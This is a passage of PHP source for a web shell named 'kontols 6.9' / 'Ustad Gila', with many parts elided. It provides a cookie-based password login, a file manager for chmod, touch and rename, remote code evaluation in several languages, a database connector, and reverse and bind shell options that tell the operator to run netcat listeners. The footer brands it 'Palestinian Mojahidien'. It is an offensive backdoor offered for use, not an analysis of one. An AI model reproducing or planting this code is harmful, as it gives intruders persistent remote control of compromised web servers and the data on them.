...
$s_name = "kontols"; // shell name
$s_ver = "6.9"; // shell ver
$s_title = $s_name." ".$s_ver; // shell title
$s_pass = "b3cd915d758008bd19d0f2428fbb354a"; 
$s_color = "01f90c"; // shell theme color, default : 4c83af
$s_login_time = 3600 * 24 * 7; // cookie time (login)

$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['ustadgila'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['ustadgila']))) $s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$s_login = strtolower(md5(trim($_REQUEST['login'])));
		if(strtolower(trim($s_pass)) == $s_login){
			setcookie("ustadgila",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_REQUEST['x']) && ($_REQUEST['x']=='logout')){
		$s_reload = (isset($_COOKIE['ustadgila_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
...
$s_favicon = "http://1.bp.blogspot.com/-rapkarQThL0/UmNku2HkvZI/AAAAAAAAAB8/nO6n4_hYWEs/s1600/923149_253977294740424_1978241582_n.jpg";
$s_checkbox_img = "http://1.bp.blogspot.com/-rapkarQThL0/UmNku2HkvZI/AAAAAAAAAB8/nO6n4_hYWEs/s1600/923149_253977294740424_1978241582_n.jpg";
...
function showdir($s_cwd){
		...
		if(is_dir($s_l)){
			if($s_l=="."){
				...
				<div id='titik1_form' class='sembunyi'>
					...
					<input class='inputzbut' type='submit' name='rename' style='width:35px;' value='Ruqyah' />
					</form>
	...
	$s_buff .= "<tr style='background:#181818;'><td style='text-align:center;border-top:3px solid #222;text-indent:4px;'>
			...
			</td><td colspan='".$s_colspan."'><noscript><input type='button' value='Ruqyah' class='inputzbut' onclick='massactgo();' /></noscript></td>
			</form>
			</td>
			</tr>
			</table>
...
if(isset($_COOKIE['ustadgila_included'])){
	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("ustadgila_included", "0" ,time() - $s_login_time);
	...
	if(strcmp($s_cek1,$s_cek2)!=0){
		...
		setcookie("ustadgila_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
...
if($s_auth){
	...
	if(isset($_REQUEST['y'])){
		...
		if(!empty($s_buffer)){
			...
			elseif($_REQUEST['y']=='chmod'){
				$s_result .= "<div class='notif'>chmod ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='0755' name='chmodok' style='width:30px;text-align:center;' maxlength='4' /><input class='inputzbut' type='submit' value='Ruqyah' /></form></div>";
				foreach($s_lists as $s_l) $s_result .= "<p class='notif'>".$s_l."</p>";
			}
			elseif($_REQUEST['y']=='touch'){
				$s_result .= "<div class='notif'>touch ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".date("d-M-Y H:i:s",time())."' name='touchok' style='width:130px;text-align:center;' /><input class='inputzbut' type='submit' value='Ruqyah' /></form></div>";
				foreach($s_lists as $s_l) $s_result .= "<p class='notif'>".$s_l."</p>";
			}
	...
	if(isset($_REQUEST['x']) && ($_REQUEST['x']=='eval')){
		...
		if(isset($_REQUEST['evalcode'])){
			...
			elseif(strtolower($s_lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
					...
					$s_rand = "ustadgila_".substr(md5(time().rand(0,100)),0,8);
					$s_script = $s_rand;
		...
		$s_result .= "<form action='".$s_self."' method='post'>
					...
					<table><tr><td style='padding:0;'><p><input type='submit' name='evalcodesubmit' class='inputzbut' value='Ruqyah' style='width:120px;height:30px;' /></p>
...
", $s_i_buffs[1]);
		...
		if(isset($_REQUEST['connect'])){
			...
			if($s_con!==false){
				...
				$s_result .= "<form action='".$s_self."' method='post'>
					...
					<p><input type='submit' name='gogo' class='inputzbut' value='Ruqyah' style='width:120px;height:30px;' />
	...
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='rs')){
		...
		$s_rspesana = "Press &#39;  Ruqyah  &#39; button and run &#39;  nc <i>server_ip</i> <i>port</i>  &#39; on your computer";
		$s_rspesanb = "Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Ruqyah  &#39; button";
		...
		foreach($s_rslist as $s_rstype=>$s_rstitle){
			...
			<input type='submit' name='".$s_rstype."' class='inputzbut' value='Ruqyah' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			&nbsp;&nbsp;<span>".$s_rspesan."</span>
...
<table id='main'><tr><td>
<?php if($s_auth){?>
	<div><span style='float:right;'><a href='<?php echo $s_self; ?>x=logout' onclick='return false;'>log out</a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>' onclick='return false;'>Ustad Gila</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>
...
?>' />
		<noscript><input class='inputzbut' type='submit' value='Ruqyah' name='submitcmd' style='width:80px;' /></noscript>
		</form>
		</td>
		</tr>
		</table>
	</div>
	<br><br><br><font face=" Ubuntu Mono" color="#01f90c"><i><center>&#1601;&#1614;&#1576;&#1616;&#1571;&#1610;&#1617;&#1616; &#1570;&#1604;&#1614;&#1570;&#1569; &#1585;&#1614;&#1576;&#1617;&#1616;&#1603;&#1615;&#1605;&#1614;&#1575; &#1578;&#1615;&#1603;&#1614;&#1584;&#1617;&#1616;&#1576;&#1614;&#1575;&#1606;&#1616;<br>  Then which of the Blessings of your Lord will you both deny? </center> </i></font><br><br><br>
	...
	<input class='inputzbut' type='submit' value='Ruqyah' name='submitlogin' style='width:80px;' />
	</form>
	</div>
<?php } ?>
</td></tr></table>
<p class='footer' ><font color='#01f90c' >Palestinian Mojahidien &copy; <?php echo @date("Y",time())." ".$s_name; ?></font></p>
